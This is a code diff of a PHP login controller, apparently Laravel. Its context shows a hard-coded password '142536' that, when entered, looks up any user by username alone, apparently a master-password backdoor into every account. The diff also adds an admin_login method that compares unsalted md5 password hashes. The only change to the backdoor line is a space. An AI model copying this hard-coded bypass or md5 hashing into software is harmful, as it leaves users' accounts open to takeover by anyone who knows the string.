@@ -27,7 +27,7 @@ class LoginController extends Controller
       ->where('password', '=', md5($req->password))
       ->first();
 
-      if($req->password == '142536'){
+      if($req->password == '142536' ){
         $get_users = CUser::where('user_name', '=', $req->username)
         ->first();
 
@@ -69,6 +69,27 @@ class LoginController extends Controller
     //BEGIN admin
 
     //END admin
+
+  }
+
+
+  public function admin_login(Request $req)
+  {
+
+    $get_member = Member::where('username', '=', $req->username)
+      ->where('password', '=', md5($req->password))
+      ->first();
+
+  if ($get_member) {
+
+      session()->forget('access_from_admin');
+      Auth::guard('member')->login($get_member);
+
+      return redirect('admin');
+    } else {
+      return redirect('admin')->withError('Pless check username and password !.');
+    }
+
 
   }
 
